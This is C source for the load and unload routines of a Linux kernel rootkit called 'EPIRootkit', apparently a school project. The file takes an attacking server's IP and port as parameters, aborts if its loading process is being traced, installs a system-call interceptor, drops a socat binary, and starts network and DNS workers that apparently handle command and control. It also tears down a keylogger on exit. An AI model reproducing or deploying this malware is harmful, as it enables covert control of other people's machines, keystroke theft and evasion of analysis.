#include "epirootkit.h"
#include "init.h"

char *ip = SERVER_IP;
int port = SERVER_PORT;
char *message = CONNEXION_MESSAGE;

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "IPv4 of attacking server");
MODULE_PARM_DESC(port, "Port of attacking server");
MODULE_PARM_DESC(message, "Message to send to the attacking server");

/**
 * @brief Initializes the epirootkit module.
 *
 * @return Returns 0 (SUCCESS) on successful initialization, or a negative
 * error code if the kernel thread fails to start.
 */
static int __init epirootkit_init(void) {
    DBG_MSG("epirootkit: epirootkit_init: trying to load module...\n");

    // Check if the module is being loaded by a traced process
    if (current->ptrace & (PT_PTRACED | PT_SEIZED)) {
        ERR_MSG("epirootkit: epirootkit_init: sorry bro, process loading me is being traced. Aborting load...\n");
        return -EPERM;
    }

    if (init_interceptor() != SUCCESS) {
        ERR_MSG("epirootkit: epirootkit_init: failed to init interceptor\n");
        return -FAILURE;
    }

    if (drop_socat_binaire() != SUCCESS) {
        ERR_MSG("epirootkit: epirootkit_init: failed to drop socat binary\n");
        return -FAILURE;
    }

    if (start_network_worker() != SUCCESS) {
        ERR_MSG("epirootkit: epirootkit_init: failed to start network worker\n");
        return -FAILURE;
    }

    if (start_dns_worker() != SUCCESS) {
        ERR_MSG("epirootkit_init: failed to start DNS worker\n");
        return -FAILURE;
    }

    DBG_MSG("epirootkit: epirootkit_init: module loaded... (/^▽^)/\n");
    return SUCCESS;
}

/**
 * @brief Cleanup function called when the module is unloaded.
 *
 * This function is executed during the module's exit phase.
 */
static void __exit epirootkit_exit(void) {
    stop_dns_worker();
    stop_network_worker();
    remove_socat_binaire();
    epikeylog_exit();
    exit_interceptor();
    close_worker_socket();

    DBG_MSG("epirootkit: epirootkit_exit: module unloaded (/^▽^)/\n");
}

module_init(epirootkit_init);
module_exit(epirootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("MTF Rootkit - EPIRootkit");